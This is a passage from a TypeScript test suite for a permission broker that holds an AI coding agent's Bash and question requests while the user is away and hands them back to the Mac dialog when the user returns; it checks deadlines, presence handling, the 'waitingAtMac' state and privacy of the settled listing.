      const held = await parkOne(broker, stamped('Bash', { command: 'touch y' }, clock.now))
      expect(held.request.deadlineAt - clock.now).toBe(600_000)
      expect(held.request.awayHold).toBe(true)
    } finally {
      __resetClientLivenessForTests()
    }
  })

  it('an unreadable presence age or window is no presence: {} at once', async () => {
    for (const over of [{ presenceAgeMs: () => { throw new Error('x') } }, { presenceAgeMs: () => Number.NaN }, { presenceAgeMs: () => -1 }]) {
      const { broker, clock } = away(over as Partial<PermissionBrokerDeps>, { seenAt: null })
      expect(await broker.admit(stamped('Bash', { command: 'touch x' }, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    }
    // A window that cannot be read is the 30 s live window: a 10 minute old presence is stale.
    const { broker, clock } = away({ awayRecentClientMs: () => { throw new Error('x') } }, { seenAt: null })
    expect(await broker.admit(stamped('Bash', { command: 'touch y' }, clock.now))).toEqual({ ok: false, reason: 'no_client' })
  })

  it('a mixed tick: a quiet client hands back what is not away-held and keeps what is', async () => {
    let hold = 0
    const { broker, clock, s } = away({ awayHoldMs: () => hold, lastLegacyPollAt: () => s.seenAt })
    const plain = await parkOne(broker, stamped('Bash', { command: 'echo plain' }, clock.now))
    hold = DEFAULT_HOLD_MS
    const kept = await parkOne(broker, stamped('Bash', { command: 'echo kept' }, clock.now))
    s.seenAt = null
    await broker.tick()
    expect(plain.sent).toEqual([{}])
    expect(kept.sent).toEqual([])
    expect(broker.list().map(item => item.id)).toEqual([kept.id])
  })

  it('the desk-return handover: desk activity hands an away-held item to the Mac within one tick, with no client', async () => {
    const { broker, clock, s } = away({}, { seenAt: null })
    const { id, sent } = await parkOne(broker, stamped('Bash', { command: 'touch a' }, clock.now))
    clock.now += 200_000
    await broker.tick()
    expect(sent).toEqual([])
    s.idle = 2
    await broker.tick()
    expect(sent).toEqual([{}])
    expect(broker.answer(id, { clientAnswerId: 'late', decision: 'allow' })).toEqual({ status: 409, body: { error: 'handed_to_desk', reason: 'handed_to_desk' } })
    expect(broker.settledList()).toMatchObject([{ id, resolution: 'handed_to_desk', answerable: false, awayHold: true, waitingAtMac: true }])
  })

  it('at the desk when it arrives: {} at once, as today, away hold or not', async () => {
    const { broker, clock, s } = away({}, { seenAt: null, idle: 89 })
    expect(await broker.admit(stamped('Bash', { command: 'ls' }, clock.now))).toEqual({ ok: false, reason: 'desk_active' })
    s.idle = null
    expect(await broker.admit(stamped('Bash', { command: 'ls' }, clock.now))).toEqual({ ok: false, reason: 'desk_unknown' })
    expect(broker.stats().counters.parked).toBe(0)
  })

  it('every path still ends: expired at the away limit by the timer, and the Mac is then waiting on it', async () => {
    const { broker, clock } = away({ pollMs: 60_000 })
    const { id, sent, request } = await parkOne(broker, stamped('Bash', { command: 'touch b' }, clock.now))
    clock.now = request.deadlineAt
    expect(broker.list()).toEqual([])
    expect(sent).toEqual([{}])
    expect(broker.settledList()).toMatchObject([{ id, resolution: 'expired', waitingAtMac: true }])
  })

  it('no_client and drained also leave the Mac dialog up: waitingAtMac (QA round 1, Ghost Hunter S1)', async () => {
    const { broker, clock, s } = away({ lastLegacyPollAt: () => s.seenAt, awayHoldMs: () => 0 })
    const quiet = await parkOne(broker, stamped('Bash', { command: 'touch q' }, clock.now))
    s.seenAt = null
    await broker.tick()
    expect(quiet.sent).toEqual([{}])
    s.seenAt = clock.now
    const drained = await parkOne(broker, stamped('Bash', { command: 'touch d' }, clock.now))
    s.admissions = false
    await broker.tick()
    expect(drained.sent).toEqual([{}])
    const byId = new Map(broker.settledList().map(v => [v.id, v]))
    expect(byId.get(quiet.id)).toMatchObject({ resolution: 'no_client', waitingAtMac: true })
    expect(byId.get(drained.id)).toMatchObject({ resolution: 'drained', waitingAtMac: true })
  })

  it('waitingAtMac clears only by its own request: its tool, its own denial, or a turn end; never another dialog of the same tool (QA round 1, Skeptic N3)', async () => {
    const { broker, clock, s } = away()
    const rm = { command: 'rm -rf build' }
    const push = { command: 'git push' }
    const a = await parkOne(broker, stamped('Bash', rm, clock.now))
    const b = await parkOne(broker, stamped('Bash', push, clock.now))
    s.idle = 1
    await broker.tick()
    expect(broker.waitingAtMacCount()).toBe(2)
    // Miles denies `rm -rf build` at the Mac; `git push` is still on screen.
    broker.observeHookEvent(hookEvent('PermissionDenied', clock.now + 10, { tool_name: 'Bash', tool_input: rm }), false)
    const after = new Map(broker.settledList().map(v => [v.id, v]))
    expect(after.get(a.id)?.waitingAtMac).toBe(false)
    expect(after.get(b.id)?.waitingAtMac).toBe(true)
    // A child, history, another command: still waiting.
    broker.observeHookEvent(hookEvent('PostToolUse', clock.now + 11, { tool_name: 'Bash', tool_input: push }), true)
    broker.observeHookEvent(hookEvent('PostToolUse', clock.now - 5_000, { tool_name: 'Bash', tool_input: push }), false)
    broker.observeHookEvent(hookEvent('PermissionDenied', clock.now + 12, { tool_name: 'Bash', tool_input: { command: 'git push ' } }), false)
    expect(broker.waitingAtMacCount()).toBe(1)
    // Its own tool ran.
    broker.observeHookEvent(hookEvent('PostToolUse', clock.now + 13, { tool_name: 'Bash', tool_input: push }), false)
    expect(broker.waitingAtMacCount()).toBe(0)
    // A turn end clears one; an answered or hook_gone item never waits at the Mac.
    s.idle = 1_000
    const two = await parkOne(broker, stamped('Bash', { command: 'touch d' }, clock.now))
    const three = await parkOne(broker, stamped('Bash', { command: 'touch e' }, clock.now))
    const four = await parkOne(broker, stamped('Bash', { command: 'touch f' }, clock.now))
    expect(broker.answer(three.id, { clientAnswerId: 'x', decision: 'deny' }).status).toBe(200)
    broker.hookClosed(four.id)
    s.idle = 1
    await broker.tick()
    broker.observeHookEvent(hookEvent('Stop', clock.now + 14), false)
    const byId = new Map(broker.settledList().map(v => [v.id, v]))
    expect(byId.get(two.id)).toMatchObject({ resolution: 'handed_to_desk', waitingAtMac: false })
    expect(byId.get(three.id)).toMatchObject({ resolution: 'answered', waitingAtMac: false })
    expect(byId.get(four.id)).toMatchObject({ resolution: 'hook_gone', waitingAtMac: false })
  })

  it('a session row that reads ended clears waitingAtMac at once, by full id or the eight-character form (QA round 1, Skeptic N2)', async () => {
    const { broker, clock, s } = away()
    const q = await parkOne(broker, stamped('AskUserQuestion', ASK_INPUT, clock.now))
    s.idle = 1
    await broker.tick()
    expect(broker.waitingAtMacCount()).toBe(1)
    expect(broker.sessionRowEnded('bogus')).toBe(0)
    expect(broker.sessionRowEnded('ffffffff-0000-4000-8000-000000000000')).toBe(0)
    expect(broker.waitingAtMacCount()).toBe(1)
    expect(broker.sessionRowEnded(SESSION.slice(0, 8))).toBe(1)
    expect(broker.settledList()).toMatchObject([{ id: q.id, waitingAtMac: false }])
    // No flap: it stays cleared.
    clock.now += 59 * 60_000
    expect(broker.settledList()).toEqual([])
  })

  it('a hand-back whose {} could not be written does not claim the Mac is waiting', async () => {
    const { broker, clock, s } = away()
    const a = await broker.admit(stamped('Bash', { command: 'ls' }, clock.now))
    if (!a.ok) throw new Error(a.reason)
    const refusing: HookReplyChannel = { writable: () => true, reply: () => false }
    const id = broker.park(a.request, refusing)
    s.idle = 1
    await broker.tick()
    expect(broker.settledList()).toMatchObject([{ id, resolution: 'handed_to_desk', waitingAtMac: false }])
  })

  it('the settled listing: codes and times only, newest first, capped, but every item the Mac still waits on is listed', async () => {
    const { broker, clock, s } = away()
    const waiting = await parkOne(broker, stamped('AskUserQuestion', ASK_INPUT, clock.now))
    s.idle = 1
    await broker.tick()
    s.idle = 1_000
    clock.now += 1_000
    const answered = await parkOne(broker, stamped('Bash', { command: 'echo secret-plan' }, clock.now))
    broker.answer(answered.id, { clientAnswerId: 'a', decision: 'allow' })
    const views = broker.settledList()
    expect(views.map(v => v.id)).toEqual([answered.id, waiting.id])
    expect(Object.keys(views[1]!).sort()).toEqual(['answerable', 'awayHold', 'createdAt', 'deadlineAt', 'id', 'kind', 'provider', 'resolution', 'sessionId', 'settledAt', 'tool', 'waitingAtMac'])
    const text = JSON.stringify(views)
    expect(text).not.toContain('secret-plan')
    expect(text).not.toContain(Q1)
    expect(text).not.toContain('allow')
    // More than the cap of newer settled items: the waiting one is still listed.
    for (let i = 0; i < SETTLED_LIST_MAX + 3; i++) {
      clock.now += 1
      const p = await parkOne(broker, stamped('Bash', { command: `echo ${i}` }, clock.now))
      broker.hookClosed(p.id)
    }
    const capped = broker.settledList()
    expect(capped).toHaveLength(SETTLED_LIST_MAX)
    expect(capped.some(v => v.id === waiting.id && v.waitingAtMac)).toBe(true)
    expect(Date.parse(capped[0]!.settledAt)).toBeGreaterThanOrEqual(Date.parse(capped.at(-1)!.settledAt))
  })

  it('forgot vs moved past: waitingAtMacForgottenBefore starts at boot and moves only when a still-waiting item is dropped; one its row still waits on is kept a day (QA round 1, Ghost Hunter W1)', async () => {
    let rowWaits = false
    const { broker, clock, s } = away({ stillWaitingAtMac: (sessionId, fingerprint) => rowWaits && sessionId === SESSION && fingerprint === toolFingerprint('Bash', { command: 'touch w' }) })
    const boot = clock.now
    expect(broker.waitingAtMacForgottenBeforeMs()).toBe(boot)
    clock.now += 1_000
    const w = await parkOne(broker, stamped('Bash', { command: 'touch w' }, clock.now))
    const other = await parkOne(broker, stamped('Bash', { command: 'touch o' }, clock.now))
    s.idle = 1
    await broker.tick()
    const settledAt = clock.now
    // Moved past: cleared, then pruned after ten minutes. The horizon does not move.
    broker.observeHookEvent(hookEvent('PostToolUse', clock.now + 1, { tool_name: 'Bash', tool_input: { command: 'touch o' } }), false)
    clock.now += SETTLED_RETENTION_MS + 1
    expect(broker.settledList().map(v => v.id)).toEqual([w.id])
    expect(broker.waitingAtMacForgottenBeforeMs()).toBe(boot)
    // Its row still waits on it: kept past the hour, up to a day.
    rowWaits = true
    clock.now = settledAt + MAC_WAIT_RETENTION_MS + 60_000
    expect(broker.settledList().map(v => v.id)).toEqual([w.id])
    clock.now = settledAt + MAC_WAIT_MAX_RETENTION_MS + 1
    expect(broker.settledList()).toEqual([])
    // Dropped while still waiting: forgotten, and the horizon says so.
    expect(broker.waitingAtMacForgottenBeforeMs()).toBe(settledAt)
    expect(other.id).not.toBe(w.id)
  })

  it('awayHoldNowMs and /api/models: 600 s with the 6.60.0 hook, 0 on the earlier hook, 0 when off', () => {
    let installed: number | null = PERMISSION_HOOK_TIMEOUT_S
    let hold = DEFAULT_HOLD_MS
    const { broker } = away({ installedHookTimeoutS: () => installed, awayHoldMs: () => hold })
    registerPermissionBroker(broker)
    expect(broker.awayHoldNowMs()).toBe(600_000)
    expect(sessionQuestionsCapability()).toMatchObject({ awayHoldMs: 600_000, awayRecentClientMs: 1_800_000 })
    installed = LEGACY_PERMISSION_HOOK_TIMEOUT_S
    expect(broker.awayHoldNowMs()).toBe(0)
    installed = null
    expect(broker.awayHoldNowMs()).toBe(0)
    installed = PERMISSION_HOOK_TIMEOUT_S
    hold = 0
    expect(broker.awayHoldNowMs()).toBe(0)
    expect(sessionQuestionsCapability()).toMatchObject({ awayHoldMs: 0, awayRecentClientMs: 0 })
  })
})

describe.skipIf(process.platform !== 'darwin')('the desk, read for real', () => {
  it('ioreg answers a whole number of idle seconds, fast', async () => {
    const started = performance.now()
    const idle = await readHidIdleSeconds()
    expect(performance.now() - started).toBeLessThan(1_000)
    expect(Number.isInteger(idle)).toBe(true)
    expect(idle!).toBeGreaterThanOrEqual(0)
  })
})
